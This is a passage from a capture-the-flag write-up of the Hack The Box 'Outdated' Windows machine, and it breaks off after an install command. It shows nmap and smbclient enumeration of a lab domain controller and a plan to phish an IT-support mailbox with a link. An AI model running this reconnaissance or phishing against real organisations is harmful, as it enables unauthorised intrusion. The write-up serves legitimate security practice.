<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.7.32">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2022-08-22">
<meta name="description" content="Outdated is a medium-rated Windows machine from Hack The Box. With a release containing a massive unintended path (Zerologon), paired with huge stability issues, this box has been one of the least enjoyable in a good while; mainly due to frustration. Each individual step along the way is unique and the concept is cool, but the execution is sadly lacking. Nevertheless I deepened my knowledge of Windows AD structure and gained a new privesc tool that might come in handy for future tests.">

<title>Outdated - Hack The Box – Exploit.se</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
html { -webkit-text-size-adjust: 100%; }
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed quarto-light">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../assets/images/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../writeups.html"> 
<span class="menu-text">Writeups</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Outdated - Hack The Box</h1>
                  <div>
        <div class="description">
          Outdated is a medium-rated Windows machine from Hack The Box. With a release containing a massive unintended path (Zerologon), paired with huge stability issues, this box has been one of the least enjoyable in a good while; mainly due to frustration. Each individual step along the way is unique and the concept is cool, but the execution is sadly lacking. Nevertheless I deepened my knowledge of Windows AD structure and gained a new privesc tool that might come in handy for future tests.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
                <div class="quarto-category">windows</div>
                <div class="quarto-category">smtp</div>
                <div class="quarto-category">cve-2022-30190</div>
                <div class="quarto-category">bloodhound</div>
                <div class="quarto-category">shadow credentials</div>
                <div class="quarto-category">wsus</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">August 22, 2022</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
  <li><a href="#group-information" id="toc-group-information" class="nav-link" data-scroll-target="#group-information">GROUP INFORMATION</a></li>
  <li><a href="#privileges-information" id="toc-privileges-information" class="nav-link" data-scroll-target="#privileges-information">PRIVILEGES INFORMATION</a>
  <ul class="collapse">
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
  </ul></li>
  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
  </ul></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-v</span> <span class="at">-p-</span> 10.10.11.175 <span class="at">--open</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>      STATE SERVICE</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">25/tcp</span>    open  smtp</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open  domain</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open  ldapssl</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="ex">5985/tcp</span>  open  wsman</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">8530/tcp</span>  open  unknown</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">8531/tcp</span>  open  unknown</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">9389/tcp</span>  open  adws</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="ex">49667/tcp</span> open  unknown</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">49669/tcp</span> open  unknown</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="ex">49670/tcp</span> open  unknown</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="ex">49672/tcp</span> open  unknown</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="ex">49884/tcp</span> open  unknown</span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="ex">49903/tcp</span> open  unknown</span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="ex">49917/tcp</span> open  unknown</span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> <span class="at">-p</span> 25,53,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49669,49670,49672,49884,49903,49917 10.10.11.175</span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>      STATE SERVICE       VERSION</span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a><span class="ex">25/tcp</span>    open  smtp          hMailServer smtpd</span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">smtp-commands:</span> mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span> 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw">;</span> <span class="ex">+7h00m01s</span> from scanner time.</span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: </span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open  microsoft-ds<span class="pp">?</span></span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open  kpasswd5<span class="pp">?</span></span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: </span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw">;</span> <span class="ex">+7h00m01s</span> from scanner time.</span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw">;</span> <span class="ex">+7h00m01s</span> from scanner time.</span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: </span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw">;</span> <span class="ex">+7h00m01s</span> from scanner time.</span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: </span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="ex">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er">(</span><span class="ex">SSDP/UPnP</span><span class="kw">)</span></span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Not Found</span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a><span class="ex">8530/tcp</span>  open  http          Microsoft IIS httpd 10.0</span>
<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Site doesnt have a title.</span>
<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">http-methods:</span> </span>
<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a><span class="ex">8531/tcp</span>  open  unknown</span>
<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a><span class="ex">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a><span class="ex">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a><span class="ex">49669/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a><span class="ex">49670/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a><span class="ex">49672/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a><span class="ex">49884/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a><span class="ex">49903/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a><span class="ex">49917/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: Hosts: mail.outdated.htb, DC<span class="kw">;</span> <span class="ex">OS:</span> Windows<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> script results:</span>
<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_clock-skew:</span> mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span>
<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">smb2-security-mode:</span> </span>
<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3.1.1:</span> </span>
<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>    Message signing enabled and required</span>
<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">smb2-time:</span> </span>
<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">date:</span> 2022-08-15T14:52:10</span>
<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  start_date: N/A</span>
<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo nmap <span class="at">-sU</span> <span class="at">--top-port</span> 100 10.10.11.175 <span class="at">--open</span></span>
<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>    STATE SERVICE</span>
<span id="cb1-93"><a href="#cb1-93" aria-hidden="true" tabindex="-1"></a><span class="ex">123/udp</span> open  ntp</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated smbclient <span class="at">-L</span> 10.10.11.175</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Password</span> for <span class="pp">[</span><span class="ss">WORKGROUP</span><span class="dt">\v</span><span class="ss">oid</span><span class="pp">]</span>:</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Sharename</span>       Type      Comment</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">---------</span>       <span class="at">----</span>      <span class="at">-------</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ADMIN$</span>          Disk      Remote Admin</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C$</span>              Disk      Default share</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">IPC$</span>            IPC       Remote IPC</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NETLOGON</span>        Disk      Logon server share </span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Shares</span>          Disk      </span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">SYSVOL</span>          Disk      Logon server share </span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">UpdateServicesPackages</span> Disk      A network share to be used by client systems for collecting all software packages <span class="er">(</span><span class="ex">usually</span> applications<span class="kw">)</span> <span class="ex">published</span> on this WSUS system.</span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">WsusContent</span>     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.</span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">WSUSTemp</span>        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.</span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated smbclient //10.10.11.175/Shares</span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Password</span> for <span class="pp">[</span><span class="ss">WORKGROUP</span><span class="dt">\v</span><span class="ss">oid</span><span class="pp">]</span>:</span>
<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> ls</span>
<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>  <span class="bu">.</span>                                   D        0  Mon Jun 20 17:01:33 2022</span>
<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>  <span class="ex">..</span>                                  D        0  Mon Jun 20 17:01:33 2022</span>
<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>  <span class="ex">NOC_Reminder.pdf</span>                   AR   106977  Mon Jun 20 17:00:32 2022</span>
<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>        <span class="ex">9116415</span> blocks of size 4096. 1369832 blocks available</span>
<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> get NOC_Reminder.pdf</span>
<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="ex">getting</span> file <span class="dt">\N</span>OC_Reminder.pdf of size 106977 as NOC_Reminder.pdf <span class="er">(</span><span class="ex">614.5</span> KiloBytes/sec<span class="kw">)</span> <span class="kw">(</span><span class="ex">average</span> 614.5 KiloBytes/sec<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In the PDF we find information about a recent breach, where users are asked to mail information to <code>itsupport@outdated.htb</code> - this might be a good entrypoint for us using phising if we’re able to compromize the SMTP server or setup our own SMTP server.</p>
<p><img src="images/outdated01.png" class="img-fluid"></p>
<p>Lets start by trying to setup a local SMTP server and mail a phishing/test link to <code>itsupport</code>. Before sending the email, make sure to start a local HTTP server to capture the request if itsupport clicks the link.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated apt install mailutils postfix</span>
